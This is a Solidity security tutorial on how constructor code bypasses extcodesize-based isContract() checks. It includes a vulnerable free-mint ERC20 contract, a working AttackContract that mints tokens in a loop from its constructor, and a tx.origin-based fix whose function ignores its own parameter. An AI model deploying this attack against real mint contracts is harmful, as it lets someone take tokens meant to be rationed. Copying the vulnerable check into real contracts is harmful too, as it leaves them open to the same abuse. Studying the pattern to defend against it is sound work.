---
title: Bypass Contract Check
displayed_sidebar: generalSidebar
keywords:
  - smart-contracts
  - security
  - vulnerabilities
  - contract-check
  - extcodesize
  - bytecode
  - eoa
  - free-mint
  - solidity
  - constructor-exploit
  - prevention
tags:
  - Constructor
  - Security
  - Smart Contracts
---

Many free-mint projects utilize the `isContract()` method to limit access to external accounts (EOAs) and restrict contract addresses. This method leverages `extcodesize` to determine the runtime `bytecode` length of an address. If it is greater than zero, the address is deemed a contract; otherwise, it is considered an EOA.

```solidity
    // Using extcodesize to check if an address is a contract
    function checkContract(address account) public view returns (bool) {
        uint size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }
```

However, a vulnerability exists because, during contract creation, the runtime `bytecode` has not yet been stored at the address, so the `bytecode` length is zero. If we place our logic within the constructor, we can bypass the `isContract()` check.

**Example of the Vulnerability**

In the example below, `FreemintERC20` contract uses the `checkContract()` function to prevent contract addresses from executing its `mintTokens()` function, which is intended to prevent automated bulk minting. Each call to `mintTokens()` mints 100 tokens.

```solidity
// Using extcodesize to check if an address is a contract
contract FreemintERC20 is ERC20 {
    constructor() ERC20("Token", "TKN") {}

    function checkContract(address account) public view returns (bool) {
        uint size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    // mint function can only be called by non-contract addresses (vulnerable)
    function mintTokens() public {
        require(!checkContract(msg.sender), "Contracts are not allowed!");
        _mint(msg.sender, 100);
    }
}
```

We create an attack contract that calls `mintTokens()` multiple times during its constructor to mint `1000` tokens:

```solidity
// Exploiting constructor characteristics for attacks
contract AttackContract {
    bool public detectedAsContract;
    address public targetContract;

    // During contract creation, extcodesize is 0, thus bypassing isContract() checks.
    constructor(address addr) {
        targetContract = addr;
        detectedAsContract = FreemintERC20(addr).checkContract(address(this));
        for(uint i; i < 10; i++){
            FreemintERC20(addr).mintTokens();
        }
    }

    // After contract deployment, extcodesize > 0, isContract() will detect
    function tryMint() external {
        FreemintERC20(targetContract).mintTokens();
    }
}
```

In this contract, calling `mintTokens()` within the constructor will bypass the `isContract()` check successfully and mint the tokens. The state variable `detectedAsContract` will be set to `false` in the constructor. After deployment, the `runtime bytecode` is stored at the contract address, and `extcodesize > 0`, thus `checkContract()` will successfully block the minting when calling `mintTokens()`.

**Prevention Methods**

We can use `(tx.origin == msg.sender)` to determine if the caller is a contract. If the caller is an EOA, then `tx.origin` and `msg.sender` will be equal; if they are not equal, the caller is a contract.

```solidity
function realContractCheck(address account) public view returns (bool) {
    return (tx.origin == msg.sender);
}
```
